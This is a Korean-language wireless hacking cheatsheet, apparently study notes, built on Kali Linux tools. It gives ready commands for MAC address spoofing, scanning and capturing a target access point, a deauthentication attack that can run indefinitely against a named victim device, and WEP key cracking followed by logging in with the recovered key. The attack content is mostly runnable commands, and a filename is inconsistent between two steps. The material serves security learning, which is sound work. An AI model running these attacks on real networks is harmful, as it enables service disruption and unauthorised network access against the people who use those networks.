# 네트워크 해킹 Cheatsheet

## Requirement

- **무선 랜카드** 구비
  - `Kali Linux` 환경과 호환 가능
  - `monitor` 모드 설정 가능
- `Kali Linux` VM

## `managed` <-> `monitor` mode switching

### `managed` -> `monitor`

``` zsh
ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

### `monitor` -> `managed`

``` zsh
ifconfig wlan0 down
iwconfig wlan0 mode managed
ifconfig wlan0 up
```

## MAC Address Fabrication

``` zsh
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```

## `airodump-ng` - Nontargeted

### `2.4GHz` Only

``` zsh
# monitor 모드 활성화 필수
airodump-ng wlan0
```

### `5GHz` Only

``` zsh
# monitor 모드 활성화 필수
# 5GHz 인식 가능 무선 랜카드 필수
airodump-ng --band a wlan0
```

### `2.4GHz` & `5GHz`

``` zsh
# monitor 모드 활성화 필수
# 5GHz 인식 가능 무선 랜카드 필수
airodump-ng --band abg wlan0
```

## `airodump-ng` - Targeted

### Scan Only

``` zsh
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write test wlan0
```

### Scan & Save logs

#### 1. Scan w/ `--write` option

``` zsh
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write test wlan0
```

#### 2. See log files

``` zsh
# press Ctrl+C and kill the airodump-ng scan

ls

# '-01'자가 붙어서 생성되는 파일들을 확인
# test-01.cap
# test-01.csv
# test-01.kismet.csv
# test-01.kismet.netxml

# Wireshark
wireshark
# Wireshark GUI에서, [File] - [Open] - 'test-01.csv' 선택
```

#### 3. Use `Wireshark`

``` zsh
# Wireshark
wireshark
# Wireshark GUI에서, [File] - [Open] - 'test-01.csv' 선택
```

## Deauthentication Attack

### Script

``` zsh
aireplay-ng --deauth 0 -a 00:99:88:77:66:55 -c 00:11:22:33:44:55 wlan0
```

### Description

#### `--deauth`

이 명령으로 던질 Deauth 공격 패킷의 양

- 예시
  - `0`: **영원히** 패킷을 던짐(영구 지속)
  - `1`: 패킷을 **1개**만 던짐
  - `2`: 패킷을 **2개** 던짐(단발성 Deauth 공격의 최소 기준)
  - `1000000`: 패킷을 **1,000,000개** 던짐 (반응 확인용)

- **팁: 용도별 적정 개수**
  - 단발성으로 Deauth가 필요한 경우: `2 ~ 4`; 최소 `2`, **권장 `4`**
  - 장기간 Deauth가 필요한 경우: `1000000`(큰 수) 혹은 `0`(영구)

#### `-a`

타겟으로 잡은 특정 AP의 MAC Address

(=희생자가 접속 중인 Wi-Fi의 공유기 Mac Address)

#### `-c`

희생자의 디바이스 Mac Address

(예: 랩탑, 스마트폰, 기타 Wi-Fi 접속이 필요한 IoT 기기 등...)

## `WEP` Hacking

### 공격 선행 조건

`airodump-ng` - Targeted - Scan & Save logs 선행

1. 공격 ap 선정
2. 공격 대상 선정
3. `*-01.cap` 형태로 덤프파일 확보

``` zsh
# 예시
airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write basic_wep wlan0
```

### 공격 실행

덤프 파일 `basic_wep-01.cap` 확보하였을 때, 아래를 입력

``` zsh
aircrack-ng basic-wep-01.cap 
```

결과는 다음과 같고, 아래 문구가 나오는지 확인

``` zsh
# ...
# KEY FOUND! [ 5A:61:6B:6B:30 ] (ASCII: Zakk0 )
# ...
```

얻은 `KEY`를 통해 랩탑이나 스마트폰으로 와이파이 접속 시도

``` zsh
# 찾은 키 값을 바탕으로, 일반 디바이스로 와이파이 로그인 시도

# 1. 변환된 문자열 그대로 이용 
Wi-Fi SSID: Zako
Password: Zakk0

# 2. ACSII 코드 이용(콜론은 다 지워야 함)
# 5A:61:6B:6B:30 -> 5A616B6B30
Wi-Fi SSID: Zako
Password: 5A616B6B30

# ... Connected!
```

## Fake Authentication Attack

### 사용 조건

- 비활성화 네트워크 **(이미 연결된 기기가 없어 감청이 불가능함)**

### (작성 중...)